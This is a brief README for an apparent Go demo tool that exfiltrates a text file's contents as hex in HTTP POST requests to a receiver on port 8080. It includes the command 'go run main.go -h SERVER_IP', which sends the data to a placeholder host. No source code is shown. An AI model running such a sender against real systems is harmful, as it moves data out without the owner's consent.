# Data Exfiltration

Data Exflitration using HTTP POST requests

## Description

The project consists of two folder one for the sender and one for the recevier. The send program uses the "textfile.txt" as the data to be exfiltrated. The receive program waits for Post requests at port 8080 and creates an "output.txt." The file "output.txt" has the hexadecimal data which is then converted to ASCII in the "decoded.txt" file when the server is closed with a key interrupt (e.g. CTRL-C).

## Executing program

### Running the receiver 

* Make sure you are in the recv folder
* The IP of the receiver/server will be printed to the console incase the sender does not know it

```
go run main.go
```

### Running the sender
* Make sure you are in the send folder
* Server IP is formated as A.B.C.D

```
go run main.go -h SERVER_IP
```

## Future Additions 

* Change the output.txt to also include the source to seperate packets from different address
* Add a signal to allow for decoding of output.txt at anytime instead of just when the server closes